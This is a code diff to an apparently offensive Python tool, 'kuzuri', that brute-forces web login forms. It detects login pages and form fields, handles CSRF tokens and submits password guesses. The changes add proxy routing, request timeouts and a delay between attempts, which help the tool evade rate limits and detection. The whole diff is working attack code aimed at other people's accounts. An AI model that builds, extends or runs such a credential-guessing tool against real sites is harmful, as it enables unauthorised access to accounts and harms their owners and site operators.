@@ -1,9 +1,11 @@
-#!usr/bin/python
+#!/usr/bin/env python
 
+import signal
 import requests
 import re
 import readline
 import logging
+import time
 
 from urllib.parse import urlparse
 from removed import user_agents
@@ -11,10 +13,14 @@ from removed import cli
 from lib import brute
 
 
-logging.basicConfig(format='[kuzuri]: %(message)s', level=logging.INFO)
+logging.basicConfig(format='\r[kuzuri-chan]: %(message)s', level=logging.INFO)
 LOGIN_PAGE = ["login", "session", "index", "admin",
     'cek', "check", "panel", "dashboard", "member"]
 
+def signal_handler(sig, frame):
+    exit(logging.info('user interrupt'))
+
+signal.signal(signal.SIGINT, signal_handler)
 
 class LoginForm:
 
@@ -80,7 +86,7 @@ class LoginForm:
                             if arg.username:
                                 logging.info(question + arg.username)
                             else:
-                                arg.username = input("[kuzuri]: " + question)
+                                arg.username = input("[kuzuri-chan]: " + question)
                             local_data["value"] = arg.username
                         if type == "submit":
                             submit_button = True
@@ -121,20 +127,29 @@ if __name__ == '__main__':
             flow.data[flow.pwfield] = pwd
             headers = {"User-Agent": flow.ua}
 
-            if flow.csrf:
-                 brute.with_csrf(url=html.url,
+            try:
+                if flow.csrf:
+                    brute.with_csrf(url=html.url,
                                  action_url=flow.action,
                                  data=flow.data,
                                  csrf_name=flow.csrf,
                                  pwd=pwd,
                                  headers=headers,
+                                 proxy=arg.proxy,
+                                 timeout=arg.timeout,
                                  pattern=arg.regex_pattern)
-            else:
-                 brute.without_csrf(action_url=flow.action,
+                else:
+                    brute.without_csrf(action_url=flow.action,
                                  data=flow.data,
                                  pwd=pwd,
+                                 timeout=arg.timeout,
+                                 proxy=arg.proxy,
                                  pattern=arg.regex_pattern)
-        logging.info('password not found')
+                time.sleep(arg.delay)
+            except requests.exceptions.ReadTimeout:
+                logging.info('skipped, read timeout')
+        print()
+        logging.info('----> password not found <----\n')
     except Exception as E:
         logging.info(str(E))
 
